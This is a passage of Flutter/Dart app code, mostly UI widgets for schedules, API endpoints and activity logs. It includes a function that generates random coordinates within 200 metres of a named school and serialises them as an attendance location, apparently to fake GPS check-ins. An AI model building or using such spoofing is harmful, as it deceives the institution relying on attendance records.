  Widget build(BuildContext context) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 6),
      decoration: BoxDecoration(color: AppColors.softBlue, borderRadius: BorderRadius.circular(99)),
      child: Text(text, style: const TextStyle(color: AppColors.deepBlue, fontSize: 11, fontWeight: FontWeight.w800)),
    );
  }
}

class ScheduleRow extends StatelessWidget {
  const ScheduleRow({super.key, required this.label, required this.value});
  final String label;
  final String value;
  @override
  Widget build(BuildContext context) {
    return Container(
      margin: const EdgeInsets.only(top: 10),
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(color: const Color(0xfffbfcff), borderRadius: BorderRadius.circular(8), border: Border.all(color: AppColors.line)),
      child: Row(
        children: [
          Expanded(child: Text(label, style: const TextStyle(fontWeight: FontWeight.w800))),
          Flexible(
            child: Text(
              value,
              textAlign: TextAlign.right,
              overflow: TextOverflow.ellipsis,
              style: const TextStyle(color: AppColors.muted, fontWeight: FontWeight.w700),
            ),
          ),
        ],
      ),
    );
  }
}

class EndpointRow extends StatelessWidget {
  const EndpointRow({super.key, required this.method, required this.path});
  final String method;
  final String path;
  @override
  Widget build(BuildContext context) {
    final isPost = method == 'POST';
    return Container(
      margin: const EdgeInsets.only(top: 8),
      child: Row(
        children: [
          Container(
            width: 48,
            padding: const EdgeInsets.symmetric(vertical: 5),
            decoration: BoxDecoration(color: isPost ? AppColors.blue : AppColors.green, borderRadius: BorderRadius.circular(5)),
            child: Text(method, textAlign: TextAlign.center, style: const TextStyle(color: Colors.white, fontSize: 11, fontWeight: FontWeight.w900)),
          ),
          const SizedBox(width: 10),
          Expanded(
            child: Text(path, style: const TextStyle(fontFamily: 'Menlo', fontSize: 13, color: AppColors.text)),
          ),
        ],
      ),
    );
  }
}

class PreviewTile extends StatelessWidget {
  const PreviewTile({super.key, required this.icon, required this.title, required this.subtitle});
  final IconData icon;
  final String title;
  final String subtitle;
  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.only(top: 14),
      child: Row(
        children: [
          Container(
            width: 42,
            height: 42,
            decoration: BoxDecoration(color: AppColors.softBlue, borderRadius: BorderRadius.circular(8)),
            child: Icon(icon, color: AppColors.blue),
          ),
          const SizedBox(width: 12),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(title, style: const TextStyle(fontWeight: FontWeight.w900)),
                Text(subtitle, style: const TextStyle(color: AppColors.muted, fontSize: 12)),
              ],
            ),
          ),
        ],
      ),
    );
  }
}

class StepText extends StatelessWidget {
  const StepText(this.text, {super.key});
  final String text;
  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.only(top: 12),
      child: Row(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          const Icon(CupertinoIcons.check_mark_circled_solid, size: 20, color: AppColors.blue),
          const SizedBox(width: 10),
          Expanded(child: Text(text, style: const TextStyle(height: 1.4, color: AppColors.muted, fontWeight: FontWeight.w600))),
        ],
      ),
    );
  }
}

class ActivityLogTile extends StatelessWidget {
  const ActivityLogTile({super.key, required this.log});
  final ActivityLog log;
  @override
  Widget build(BuildContext context) {
    final color = switch (log.type) {
      LogType.ok => AppColors.green,
      LogType.error => AppColors.red,
      LogType.info => AppColors.blue,
    };
    return Container(
      margin: const EdgeInsets.only(top: 10),
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(color: Colors.white, borderRadius: BorderRadius.circular(8), border: Border.all(color: AppColors.line)),
      child: Row(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Text(timeString(log.time), style: const TextStyle(color: AppColors.muted, fontSize: 12)),
          const SizedBox(width: 10),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(log.title, style: TextStyle(color: color, fontWeight: FontWeight.w900)),
                Text(log.detail, style: const TextStyle(color: AppColors.muted, fontSize: 12)),
              ],
            ),
          ),
        ],
      ),
    );
  }
}

enum LogType { ok, error, info }

class ActivityLog {
  const ActivityLog(this.title, this.detail, this.time, this.type);
  final String title;
  final String detail;
  final DateTime time;
  final LogType type;
}

class AttendanceLocation {
  const AttendanceLocation({
    required this.latitude,
    required this.longitude,
    required this.distanceMeters,
  });

  final double latitude;
  final double longitude;
  final double distanceMeters;

  Map<String, Object> toJson() {
    return {
      'latitude': double.parse(latitude.toStringAsFixed(6)),
      'longitude': double.parse(longitude.toStringAsFixed(6)),
      'location_name': 'Tselmeg Digital International School',
    };
  }
}

AttendanceLocation randomAttendanceLocation() {
  const centerLatitude = 47.896883;
  const centerLongitude = 106.889669;
  const maxDistanceMeters = 200.0;
  const earthRadiusMeters = 6371000.0;

  final random = Random.secure();
  final distance = maxDistanceMeters * sqrt(random.nextDouble());
  final bearing = 2 * pi * random.nextDouble();
  final centerLatRad = centerLatitude * pi / 180;

  final deltaLat = (distance * cos(bearing)) / earthRadiusMeters;
  final deltaLon = (distance * sin(bearing)) / (earthRadiusMeters * cos(centerLatRad));

  return AttendanceLocation(
    latitude: centerLatitude + deltaLat * 180 / pi,
    longitude: centerLongitude + deltaLon * 180 / pi,
    distanceMeters: distance,
  );
}

List<BoxShadow> get softShadow => [
      BoxShadow(
        color: const Color(0xff1f2d4e).withValues(alpha: .08),
        blurRadius: 26,
        offset: const Offset(0, 12),
      ),
    ];

String initials(String value) {
  final base = value.split('@').first;
  if (base.length <= 2) return base.toUpperCase();
  return base.substring(0, 2).toUpperCase();
}

String timeString(DateTime value) {
  String two(int n) => n.toString().padLeft(2, '0');
  return '${two(value.hour)}:${two(value.minute)}:${two(value.second)}';
}

String dateString(DateTime value) {
  const months = ['1-р сар', '2-р сар', '3-р сар', '4-р сар', '5-р сар', '6-р сар', '7-р сар', '8-р сар', '9-р сар', '10-р сар', '11-р сар', '12-р сар'];
  const weekdays = ['Даваа', 'Мягмар', 'Лхагва', 'Пүрэв', 'Баасан', 'Бямба', 'Ням'];
  return '${weekdays[value.weekday - 1]}, ${value.year} ${months[value.month - 1]} ${value.day}';
}
